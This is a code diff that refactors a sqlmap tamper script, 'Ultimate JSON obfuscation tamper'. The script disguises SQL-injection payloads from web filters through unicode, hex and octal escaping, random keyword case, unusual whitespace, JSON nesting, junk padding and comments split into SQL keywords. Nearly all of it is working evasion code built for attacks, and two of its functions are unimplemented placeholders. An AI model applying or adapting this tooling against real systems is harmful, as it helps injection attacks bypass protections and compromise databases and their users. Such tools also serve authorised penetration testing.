@@ -1,20 +1,18 @@
 #!/usr/bin/env python
-"""
-Ultimate JSON obfuscation tamper for sqlmap.
-
-Applies a wide range of JSON‑specific evasion techniques:
-- Unicode escaping (multiple styles: \u, \x, double‑escape)
-- Random case variation for SQL keywords
-- Whitespace obfuscation using various space characters
-- JSON wrapping (simple, nested, arrays, and complex objects)
-- Junk data injection to bypass size limits
-- SQL comment injection inside JSON strings
-- Hexadecimal and octal escapes
-- JSON string concatenation
-- Configurable via the SETTINGS dict below.
-
-__priority__ = PRIORITY.NORMAL
-"""
+# -*- coding: utf-8 -*-
+#
+# Ultimate JSON obfuscation tamper for sqlmap.
+#
+# Applies a wide range of JSON‑specific evasion techniques:
+# - Unicode escaping (multiple styles: \u, \x, double‑escape)
+# - Random case variation for SQL keywords
+# - Whitespace obfuscation using various space characters
+# - JSON wrapping (simple, nested, arrays, and complex objects)
+# - Junk data injection to bypass size limits
+# - SQL comment injection inside JSON strings
+# - Hexadecimal and octal escapes
+# - JSON string concatenation
+# - Configurable via the SETTINGS dict below.
 
 import re
 import json
@@ -27,31 +25,27 @@ from lib.core.common import singleTimeWarnMessage
 __priority__ = PRIORITY.NORMAL
 
 # ==================== CONFIGURATION ====================
-# Set each technique to True/False or adjust probabilities
 SETTINGS = {
-    'unicode_escape': True,          # Convert chars to \uXXXX
-    'hex_escape': False,             # Convert chars to \xXX (less common)
-    'double_escape': False,          # Double encode \u -> \\u (may break)
-    'random_case': True,             # Randomise SQL keyword case
-    'space_obfuscation': True,       # Replace spaces with various whitespace chars
-    'json_wrap': True,               # Wrap payload in a JSON object
-    'nested_wrap': True,             # Use deep nesting
-    'array_wrap': False,             # Wrap in a JSON array
-    'add_junk': False,               # Add random junk to bypass size filters
-    'comment_injection': False,      # Insert /**/ inside SQL keywords
-    'octal_escape': False,           # Use \0xxx octal escapes
-    'unicode_alternative': False,    # Use \u{XXXX} style (ES6)
-    'json_string_concat': False,     # Break payload into concatenated JSON strings
-    'random_payload_partition': False # Split payload into multiple JSON keys
+    'unicode_escape': True,
+    'hex_escape': False,
+    'double_escape': False,
+    'random_case': True,
+    'space_obfuscation': True,
+    'json_wrap': True,
+    'nested_wrap': True,
+    'array_wrap': False,
+    'add_junk': False,
+    'comment_injection': False,
+    'octal_escape': False,
+    'unicode_alternative': False,
+    'json_string_concat': False,
+    'random_payload_partition': False
 }
 
 # ==================== CORE OBFUSCATION FUNCTIONS ====================
 
 def unicode_escape(payload):
-    """
-    Convert dangerous characters to \uXXXX Unicode escapes.
-    Includes a comprehensive mapping of SQL‑relevant characters.
-    """
+    r"""Convert dangerous characters to \uXXXX Unicode escapes."""
     escapes = {
         "'": "\\u0027",
         '"': "\\u0022",
@@ -92,7 +86,7 @@ def unicode_escape(payload):
     return payload
 
 def hex_escape(payload):
-    """Convert characters to \\xXX hexadecimal escapes."""
+    r"""Convert characters to \xXX hexadecimal escapes."""
     escapes = {
         "'": "\\x27",
         '"': "\\x22",
@@ -133,7 +127,7 @@ def hex_escape(payload):
     return payload
 
 def octal_escape(payload):
-    """Convert characters to \\0XXX octal escapes (less common in JSON but valid)."""
+    r"""Convert characters to \0XXX octal escapes."""
     escapes = {
         "'": "\\047",
         '"': "\\042",
@@ -174,13 +168,12 @@ def octal_escape(payload):
     return payload
 
 def double_escape(payload):
-    """Double‑escape by converting \ to \\ (e.g., \u0027 -> \\u0027)."""
-    # First apply a basic unicode escape, then escape the backslashes
+    r"""Double-escape by converting \ to \\ (e.g., \u0027 -> \\u0027)."""
     temp = unicode_escape(payload)
     return temp.replace("\\u", "\\\\u")
 
 def random_case(payload):
-    """Randomly change case of alphabetic characters."""
+    """Randomly change case of alphabetic characters."""  # no backslash
     result = []
     for ch in payload:
         if ch.isalpha() and random.random() > 0.5:
@@ -190,18 +183,15 @@ def random_case(payload):
     return ''.join(result)
 
 def space_obfuscation(payload):
-    """
-    Replace regular spaces with a random selection of whitespace characters.
-    Includes: space, \u0020, \t, \n, \r, \u00a0 (non‑breaking space), etc.
-    """
+    r"""Replace spaces with random whitespace characters (using raw strings)."""
     spaces = [
-        " ", "\u0020", "\t", "\n", "\r",
-        "\u00a0",  # non‑breaking space
-        "\u2000", "\u2001", "\u2002", "\u2003",
-        "\u2004", "\u2005", "\u2006", "\u2007",
-        "\u2008", "\u2009", "\u200a",
-        "\u202f",  # narrow non‑breaking space
-        "\u205f"   # medium mathematical space
+        " ", "\t", "\n", "\r",
+        chr(0xA0),   # non‑breaking space
+        chr(0x2000), chr(0x2001), chr(0x2002), chr(0x2003),
+        chr(0x2004), chr(0x2005), chr(0x2006), chr(0x2007),
+        chr(0x2008), chr(0x2009), chr(0x200A),
+        chr(0x202F), # narrow non‑breaking space
+        chr(0x205F)  # medium mathematical space
     ]
     result = []
     for ch in payload:
@@ -257,7 +247,7 @@ def add_junk_data(payload):
     return f'{{"junk":"{junk}","payload":"{payload}"}}'
 
 def inject_sql_comments(payload):
-    """Insert /**/ comments inside SQL keywords to break tokenisation."""
+    """Insert /**/ comments inside SQL keywords."""
     keywords = [
         "SELECT", "UNION", "ALL", "FROM", "WHERE", "AND", "OR", "ORDER", "BY",
         "GROUP", "HAVING", "LIMIT", "OFFSET", "INSERT", "UPDATE", "DELETE",
@@ -265,7 +255,6 @@ def inject_sql_comments(payload):
     ]
     for kw in keywords:
         if len(kw) > 3:
-            # Random split position inside the keyword
             pos = random.randint(1, len(kw)-2)
             obfuscated = kw[:pos] + "/**/" + kw[pos:]
             pattern = re.compile(r'\b' + kw + r'\b', re.IGNORECASE)
@@ -273,38 +262,19 @@ def inject_sql_comments(payload):
     return payload
 
 def json_string_concat(payload):
-    """
-    Break the payload into multiple JSON string fragments that get concatenated.
-    e.g., "SEL" + "ECT" -> "SELECT" (in JSON, concatenation with + may not work,
-    but we can use array join: ["SE","LECT"].join('') – but that's JavaScript, not JSON.
-    JSON itself doesn't support concatenation, but we can use string formatting.
-    However, we can split into multiple key/value pairs that the application might combine.
-    This is more of a server‑side logic trick.
-    For simplicity, we'll just split the payload into parts and join with spaces or comments.
-    """
-    # This is a placeholder; might not be safe for all targets.
-    # We'll just return payload unchanged for now, as it's experimental.
+    # Placeholder – not fully implemented
     return payload
 
 def random_payload_partition(payload):
-    """
-    Split the payload into multiple JSON keys (e.g., {"a":"SE","b":"LECT"})
-    The server might concatenate them. This is target‑specific.
-    """
-    # Not implemented to keep simple; could be added later.
+    # Placeholder – not fully implemented
     return payload
 
 # ==================== MAIN TAMPER ====================
 
 def tamper(payload, **kwargs):
-    """
-    Apply a random selection of enabled obfuscation techniques.
-    """
     if not payload:
         return payload
 
-    # Randomly decide which techniques to apply based on SETTINGS
-    # We'll build a list of functions and apply them in order.
     techniques = []
     if SETTINGS.get('unicode_escape', False):
         techniques.append(unicode_escape)
@@ -328,9 +298,7 @@ def tamper(payload, **kwargs):
         techniques.append(inject_sql_comments)
     if SETTINGS.get('octal_escape', False):
         techniques.append(octal_escape)
-    # Additional techniques can be added here
 
-    # Shuffle techniques to vary order
     random.shuffle(techniques)
 
     ret_val = payload
@@ -338,8 +306,6 @@ def tamper(payload, **kwargs):
         try:
             ret_val = tech(ret_val)
         except Exception as e:
-            # Log error (optional) and continue with next technique
-            # Use singleTimeWarnMessage to avoid flooding
             singleTimeWarnMessage(f"JSON tamper technique {tech.__name__} failed: {e}")
             continue
 
